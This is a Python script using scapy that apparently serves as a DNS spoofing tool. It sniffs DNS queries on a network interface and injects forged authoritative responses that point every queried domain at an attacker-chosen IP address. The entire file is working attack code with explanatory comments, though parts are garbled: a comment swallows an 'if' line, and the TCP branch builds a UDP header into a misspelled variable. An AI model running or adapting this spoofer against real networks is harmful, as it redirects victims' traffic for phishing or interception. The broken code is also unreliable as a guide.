from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *


def osCheck():
    if ( uname()[0].strip() == 'Linux' ) or ( uname()[0].strip() == 'linux ') :
        print(' Current system is Linux ... Good to go!!')
    else:
        print(' Not a Linux system ... Exiting ')
        print(' This script is designed to work on Linux ... if you wish you can modify it for your OS ')
        exit(0)


def usage():
    print(" Usage: ./dnsSpoof <interface> <IP of your DNS Server - this is more likely the IP on this system>")
    print(" e.g. ./dnsSpoof eth0 10.0.0.1")


def main():
    call('clear')
    osCheck()

    if len(argv) != 3 :
        usage()
        exit(0)

    while 1:
        # Sniff the network for destination port 53 traffic
        print(' Sniffing for DNS Packet ')
        getDNSPacket = sniff(iface=argv[1], filter="dst port 53", count=1)

        # if the sniffed packet is a DNS Query, let's do some work
        if ( getDNSPacket[0].haslayer(DNS) ) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass== 1 ):
            print('\n Got Query on %s ' %ctime())

            # Extract the src IP
            clientSrcIP = getDNSPacket[0].getlayer(IP).src

            # Extract UDP or TCP Src port
           # We don't know if this is UDP or TCP, so let's ensure we capture both            if getDNSPacket[0].haslayer(UDP) :
                clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
            elif getDNSPacket[0].haslayer(TCP) :
                clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
            else:
                pass
                # I'm not trying to figure out what you are ... moving on

            # Extract DNS Query ID. The Query ID is extremely important, as the response's Query ID must match the request Query ID
            clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id

            # Extract the Query Count
            clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount

            # Extract client's current DNS server
            clientDNSServer = getDNSPacket[0].getlayer(IP).dst

            # Extract the DNS Query. Obviously if we will respond to a domain query, we must reply to what was asked for.
            clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.qname

            print(' Received Src IP:%s, \n Received Src Port: %d \n Received Query ID:%d \n Query Data Count:%d \n Current DNS Server:%s \n DNS Query:%s ' %(clientSrcIP,clientSrcPort,clientDNSQueryID,clientDNSQueryDataCount,clientDNSServer,clientDNSQuery))

            # Now that we have captured the clients request information, let's go ahead and build our spoofed response
            # First let's set the spoofed source, which we will take from the 3rd argument entered at the command line
            spoofedDNSServerIP = argv[2].strip()

            # Now that we have our source IP and we know the client's destination IP. Let's build our IP Header
            spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)

            # Now let's move up the IP stack and build our UDP or TCP header
            # We know our source port will be 53. However, our destination port has to match our client's.
            if getDNSPacket[0].haslayer(UDP) :
                spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
            elif getDNSPacket[0].haslayer(TCP) :
                spoofedUDP_TCPPPacket = UDP(sport=53,dport=clientSrcPort)

            # Ok Time for the main course. Let's build out the DNS packet response. This is where the real work is done.
            # This section is where your knowledge of the DNS protocol comes into play. Don't be afraid if you don't know
            # do like I did and revist the RFC :-)
            spoofedDNSPakcet = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),an=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip(),ttl=86400),ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86400,rdata=argv[2]),ar=DNSRR(rrname=clientDNSQuery,rdata=argv[2].strip()))

            # Now that we have built our packet, let's go ahead and send it on its merry way.
            print(' \n Sending spoofed response packet ')
            sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet,iface=argv[1].strip(), count=1)
            print(' Spoofed DNS Server: %s \n src port:%d dest port:%d ' %(spoofedDNSServerIP, 53, clientSrcPort ))

        else:
            pass


if __name__ == '__main__':
    main()
